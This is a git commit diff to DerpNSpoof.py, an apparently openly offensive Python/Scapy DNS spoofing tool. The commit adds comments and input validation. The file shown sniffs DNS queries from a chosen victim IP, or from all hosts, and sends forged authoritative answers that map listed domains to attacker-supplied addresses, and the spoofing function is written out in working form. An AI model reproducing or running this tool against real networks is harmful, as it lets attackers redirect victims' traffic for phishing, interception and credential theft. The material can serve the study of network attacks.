2e20831200c06a0341c3470b433d7943611b1e1f
Trackbool <mistert430@gmail.com>
2018-04-07 02:48:38 +0200

    Update DerpNSpoof.py
    Adding some validations and comments

--- DerpNSpoof.py
+++ DerpNSpoof.py
@@ -7,6 +7,7 @@ import sys
 import re 
 import socket
 
+#Dictionary with console color codes to print text
 colors = {'HEADER' : "\033[95m",
     'OKBLUE' : "\033[94m",
     'RED' : "\033[91m",
@@ -38,6 +39,7 @@ def menu():
     
 menu()
 
+#Checks if an IP passed as arg is a valid IP address
 def valid_ip(address):
     try: 
         socket.inet_aton(address)
@@ -45,15 +47,17 @@ def valid_ip(address):
     except:
         return False
 
+#Gets the local IP address to avoid self spoofing
 def check_local_ip():
-    local_ip = os.popen("ip route | grep 'src' | awk {'print $9'}").read()
+    local_ip = os.popen("ip route | grep 'src' | awk {'print $9'}").read().strip()
     while True:
         if(valid_ip(local_ip)): break
-        else: local_ip = input(colors['WARNING']+"    [!] Cannot get your local IP addres, please write it: "+colors['ENDC'])
+        else: local_ip = input(colors['WARNING']+"    [!] Cannot get your local IP addres, please write it: "+colors['ENDC']).strip()
     return local_ip
 
 local_ip = check_local_ip()
 
+#Checks args length
 if len(sys.argv) != 3:
     print ('    [i] Usage <victim_ip> <records_file>')
     sys.exit(1)
@@ -64,6 +68,7 @@ else:
 sniff_filter = 'udp dst port 53'
 registers = {}
 
+#Validates args format
 def valid_args():
     all_pkt = False
     if(not valid_ip(victim_ip)):
@@ -76,20 +81,21 @@ def valid_args():
 
 all_pkt = valid_args();
 
+#Loads the records file and save it into a Dictionary 
 def read_file(path):
     if(os.path.isfile(path) and os.stat(path).st_size > 0 ):
         file = open(path,"r")
         for line in file:
-            try:
-                key,value = line.split()
-                registers[key] = value
-                if (not valid_ip(value)):
-                    print(colors['WARNING']+"    [!] Detected an invalid IP address in the file ["+value+"]"+colors['ENDC'])
+            if(line not in ['\n', '\r\n']):
+                try:
+                    key,value = line.split()
+                    registers[key] = value
+                    if (not valid_ip(value)):
+                        print(colors['WARNING']+"    [!] Detected an invalid IP address in the file ["+value+"]"+colors['ENDC'])
+                        sys.exit(1)
+                except:
+                    print(colors['FAIL']+"    [!] Invalid file format: <domain> <fake_address>"+colors['ENDC'])
                     sys.exit(1)
-
-            except:
-                print(colors['FAIL']+"    [!] Invalid file format: <domain> <fake_address>"+colors['ENDC'])
-                sys.exit(1)
         file.close()
     else:
         print(colors['FAIL']+"    [!] The file doesn't exists or is empty"+colors['ENDC'])
@@ -99,16 +105,17 @@ import logging
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import *
 
+#Checks if all hosts are spoofed or not
 def check_victims(pkt):
     if(all_pkt and IP in pkt): result = True
     elif(IP in pkt): result = (pkt[IP].src == victim_ip)
     else: result = False
     return result  
 
+#Checks if is a valid DNS query and sends a spoofed response
 def fake_dns_response(pkt):
     result = check_victims(pkt)
     if (result and pkt[IP].src != local_ip and UDP in pkt and DNS in pkt and pkt[DNS].opcode == 0 and pkt[DNS].ancount == 0 and str(pkt[DNSQR].qname)[2:len(str(pkt[DNSQR].qname))-2] in registers):
-
         cap_domain = str(pkt[DNSQR].qname)[2:len(str(pkt[DNSQR].qname))-2]
         fakeResponse = IP(dst=pkt[IP].src,src=pkt[IP].dst) / UDP(dport=pkt[UDP].sport,sport=53) / DNS(id=pkt[DNS].id,qd=pkt[DNS].qd,aa=1,qr=1, ancount=1,an=DNSRR(rrname=pkt[DNSQR].qname,rdata=registers[cap_domain]) / DNSRR(rrname=pkt[DNSQR].qname,rdata=registers[cap_domain]))
         send(fakeResponse, verbose=0)
